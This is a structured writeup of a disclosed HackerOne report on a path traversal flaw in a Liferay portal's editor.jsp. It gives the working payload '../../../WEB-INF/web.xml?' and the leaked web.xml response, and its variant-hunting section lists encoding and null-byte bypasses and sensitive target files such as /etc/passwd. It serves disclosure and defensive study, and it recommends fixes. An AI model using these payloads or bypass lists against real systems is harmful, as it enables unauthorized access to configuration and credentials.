# Path Traversal in editor.jsp - Arbitrary File Inclusion via Directory Traversal

## Metadata
- **Source:** HackerOne
- **Report:** 217344 | https://hackerone.com/reports/217344
- **Submitted:** 2017-03-30
- **Reporter:** twicedi
- **Program:** Undisclosed
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Path Traversal, Directory Traversal, CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- **CVEs:** None
- **Category:** uncategorised

## Summary
The /html/js/editor/editor.jsp endpoint fails to properly neutralize path traversal sequences (../) in the 'editorImpl' parameter, allowing attackers to access files outside the intended directory such as WEB-INF/web.xml. The vulnerability is exploitable by appending a query string terminator (?) to bypass file extension validation or error handling.

## Attack scenario
1. Attacker identifies the vulnerable editor.jsp endpoint and recognizes it accepts an 'editorImpl' parameter
2. Attacker crafts a malicious payload using ../ sequences to traverse up the directory tree: ../../../WEB-INF/web.xml
3. Attacker appends a question mark (?) to the payload to bypass validation or extension checks that would otherwise fail
4. Attacker submits HTTP GET request to /html/js/editor/editor.jsp?editorImpl=../../../WEB-INF/web.xml?
5. Server processes the path traversal and includes the sensitive web.xml configuration file in the response
6. Attacker obtains sensitive configuration data including servlet mappings, filter definitions, and potential credential information

## Root cause
The application constructs file paths using user-supplied input from the 'editorImpl' parameter without properly validating or sanitizing directory traversal sequences. Input validation fails to strip or reject ../ patterns, and path resolution does not enforce directory boundaries before file access.

## Attacker mindset
Reconnaissance-focused attacker seeking to extract sensitive configuration and application metadata. The attacker discovered the endpoint likely through directory enumeration or application mapping, then methodically tested common path traversal patterns. The discovery that appending '?' bypasses error handling demonstrates adaptive exploitation and understanding of Java servlet request parameter handling.

## Defensive takeaways
- Implement strict input validation using whitelist approach - only allow alphanumeric characters and specific safe delimiters
- Use Java's File.getCanonicalPath() to resolve all path traversal sequences, then verify the canonical path starts with the intended base directory
- Avoid string concatenation for path construction; use java.nio.file.Paths and proper Path APIs that handle directory boundaries
- Implement a Path Traversal Detection filter at the servlet level to reject requests containing ../ or ..\
- Apply principle of least privilege - run application with minimal file system permissions
- Perform security code review on all file inclusion/loading endpoints, particularly those accepting user input
- Implement WAF rules to block common path traversal patterns in query parameters
- Log and alert on suspicious path traversal attempts for security monitoring

## Variant hunting
Test other file inclusion endpoints (.jsp, .aspx handlers) for similar path traversal vulnerabilities
Try URL encoding variants: %2e%2e%2f, ..%2f, %2e%2e/ to bypass basic string matching filters
Test POST parameters and headers (X-Original-URL, X-Rewrite-URL) for path traversal injection
Attempt access to other sensitive files: /WEB-INF/classes/application.properties, /etc/passwd on Unix, C:\windows\system32\drivers\etc\hosts on Windows
Test double encoding and Unicode bypass techniques if initial filter detection is present
Fuzz with various null byte terminators and special characters (.jsp?, .jsp%00, .jsp#) to bypass validation
Scan for similar 'impl' or 'include' parameters in other endpoints throughout the application

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1083: File and Directory Discovery
- T1005: Data from Local System

## Notes
The vulnerability affects a Liferay portal installation based on the web.xml content revealed. The requirement to append '?' suggests the application may have been attempting extension-based validation (.jsp) that was bypassed by query string handling. This is a classic pre-authentication information disclosure vulnerability with potential to expose database credentials, API keys, and system architecture details visible in configuration files. The full web.xml exposure is particularly severe as it maps all servlets and filters, aiding further attack surface mapping.

## Full report
<details><summary>Expand</summary>

**Summary:**
The web application hosted on the "█████████" domain is affected by a path traversal vulnerability that could permit to an attacker to include arbirtary files that are outside of the restricted directory.

**Description:**
The affected handler is the "/html/js/editor/editor.jsp".
This handler receives, through the "editorImpl" parameter, an input from the user to construct a pathname that is intended to identify a file, but the web app does not properly neutralize "dot-dot-slash (../)" within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory as showed in the following example in which the web.xml configuration file is included:

Example of payload:
> ../../../WEB-INF/web.xml?

URL: 
(Note: the last question mark char ("?") is necessary to exploit the vulnerability otherwise an error is triggered, with a full stacktrace) 
```
https://████/html/js/editor/editor.jsp?editorImpl=../../../WEB-INF/web.xml?
```

```
HTTP/1.1 200 OK
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Thu, 30 Mar 2017 20:24:43 GMT
Connection: close
Content-Length: 54193


<?xml version="1.0"?>

<web-app xmlns="http://java.sun.com/xml/ns/j2ee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="2.4" xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
	<context-param>
		<param-name>contextClass</param-name>
		<param-value>com.liferay.portal.spring.context.PortalApplicationContext</param-value>
	</context-param>
	<context-param>
		<param-name>contextConfigLocation</param-name>
		<param-value/>
	</context-param>
	<context-param>
		<param-name>com.ibm.websphere.portletcontainer.PortletDeploymentEnabled</param-name>
		<param-value>false</param-value>
	</context-param>
	<filter>
		<filter-name>Absolute Redirects Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.absoluteredirects.AbsoluteRedirectsFilter</filter-class>
	</filter>
	<filter>
		<filter-name>Audit Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.audit.AuditFilter</filter-class>
	</filter>
	<filter>
		<filter-name>Auto Login Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.autologin.AutoLoginFilter</filter-class>
	</filter>
	<filter>

[REDACTED...]

	<filter>
		<filter-name>GZip Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.gzip.GZipFilter</filter-class>
	</filter>
	<filter>
		<filter-name>GZip Filter - Theme PNG</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.gzip.GZipFilter</filter-class>
		<init-param>
			<param-name>url-regex-pattern</param-name>
			<param-value>.+/themes/.*/images/.*\.png</param-value>
		</init-param>
	</filter>
	<filter>
		<filter-name>Header Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.header.HeaderFilter</filter-class>
		<init-param>
			<param-name>url-regex-ignore-pattern</param-name>
			<param-value>.+/-/.+</param-value>
		</init-param>
		<init-param>
			<param-name>Cache-Control</param-name>
			<param-value>max-age=315360000, public</param-value>
		</init-param>
		<init-param>
			<param-name>Expires</param-name>
			<param-value>315360000</param-value>
		</init-param>
		<init-param>
			<param-name>Vary</param-name>
			<param-value>Accept-Encoding</param-value>
		</init-param>
	</filter>
	<filter>
		<filter-name>Header Filter - JSP</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.header.HeaderFilter</filter-class>
		<init-param>
			<param-name>url-regex-pattern</param-name>
			<param-value>.+/(barebone|css|everything|main)\.jsp</param-value>
		</init-param>
		<init-param>
			<param-name>Cache-Control</param-name>
			<param-value>max-age=315360000, public</param-value>
		</init-param>
		<init-param>
			<param-name>Expires</param-name>
			<param-value>315360000</param-value>
		</init-param>
		<init-param>
			<param-name>Vary</param-name>
			<param-value>Accept-Encoding</param-value>
		</init-param>
	</filter>
	
[REDACTED...]

	<filter>
		<filter-name>Minifier Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.minifier.MinifierFilter</filter-class>
	</filter>
	<filter>
		<filter-name>Minifier Filter - JSP</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.minifier.MinifierFilter</filter-class>
		<init-param>
			<param-name>url-regex-pattern</param-name>
			<param-value>.+/(barebone|css|everything|main)\.jsp</param-value>
		</init-param>
	</filter>
	<filter>
		<filter-name>Monitoring Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.monitoring.MonitoringFilter</filter-class>
	</filter>
	<filter>
		<filter-name>Secure Main Servlet Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.secure.SecureFilter</filter-class>
		<init-param>
			<param-name>portal_property_prefix</param-name>
			<param-value>main.servlet.</param-value>
		</init-param>
	</filter>
	<filter>
		<filter-name>Session Id Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.sessionid.SessionIdFilter</filter-class>
	</filter>
	<filter>
		<filter-name>SSO CAS Filter</filter-name>
		<filter-class>com.liferay.portal.servlet.filters.sso.cas.CASFilter</filter-class>
	</filter>
	
[REDACTED...]

	<filter-mapping>
		<filter-name>Sharepoint Filter</filter-name>
		<url-pattern>/sharepoint/_vti_bin/_vti_aut/author.dll</url-pattern>
	</filter-mapping>
	<filter-mapping>
		<filter-name>Sharepoint Filter</filter-name>
		<url-pattern>/sharepoint/_vti_bin/owssvr.dll</url-pattern>
	</filter-mapping>
	<filter-mapping>
		<filter-name>SSO CAS Filter</filter-name>
		<url-pattern>/c/portal/login</url-pattern>
		<dispatcher>REQUEST</dispatcher>
		<dispatcher>FORWARD</dispatcher>
	</filter-mapping>
	<filter-mapping>
		<filter-name>SSO CAS Filter</filter-name>
		<url-pattern>/c/portal/logout</url-pattern>
		<dispatcher>REQUEST</dispatcher>
		<dispatcher>FORWARD</dispatcher>
	</filter-mapping>
	<filter-mapping>
		<filter-name>SSO Ntlm Filter</filter-name>
		<url-pattern>/c/portal/login</url-pattern>
		<dispatcher>REQUEST</dispatcher>
		<dispatcher>FORWARD</dispatcher>
	</filter-mapping>
	<filter-mapping>
		<filter-name>SSO Ntlm Post Filter</filter-name>
		<url-pattern>/*</url-pattern>
	</filter-mapping>
	
[REDACTED...]
	
	<filter-mapping>
		<filter-name>Monitoring Filter</filter-name>
		<url-pattern>/user/*</url-pattern>
		<dispatcher>REQUEST</dispatcher>
		<dispatcher>FORWARD</dispatcher>
	</filter-mapping>
	<filter-mapping>
		<filter-name>Monitoring Filter</filter-name>
		<url-pattern>/web/*</url-pattern>
		<dispatcher>REQUEST</dispatcher>
		<dispatcher>FORWARD</dispatcher>
	</filter-mapping>
	<listener>
		<listener-class>com.liferay.portal.spring.context.PortalContextLoaderListener</listener-class>
	</listener>
	<listener>
		<listener-class>com.liferay.portal.servlet.PortalSessionListener</listener-class>
	</listener>
	<listener>
		<listener-class>com.liferay.portal.kernel.servlet.PortletSessionListenerManager</listener-class>
	</listener>
	<listener>
		<listener-class>com.liferay.portal.kernel.servlet.SerializableSessionAttributeListener</listener-class>
	</listener>
	<listener>
		<listener-class>com.liferay.portal.servlet.SharedSessionAttributeListener</listener-class>
	</listener>
	<servlet>
		<servlet-name>Web Server Servlet</servlet-name>
		<servlet-class>mil.army.lwn.liferay.portal.webserver.WebServerServlet</servlet-class>
		<load-on-startup>2</load-on-startup>
	</servlet>
	<servlet>
		<servlet-name>Main Servlet</servlet-name>
		<servlet-class>com.liferay.portal.servlet.MainServlet</servlet-class>
		<init-param>
			<param-name>config</param-name>
			<param-value>/WEB-INF/struts-config.xml,/WEB-INF/struts-config-ext.xml</param-value>
		</init-param>
		<init-param>
			<param-name>debug</param-name>
			<param-value>0</param-value>
		</init-param>
		<init-param>
			<param-name>detail</param-name>
			<param-value>0</param-value>
		</init-param>
		<load-on-st

</details>

---
*Analysed by Claude on 2026-05-24*
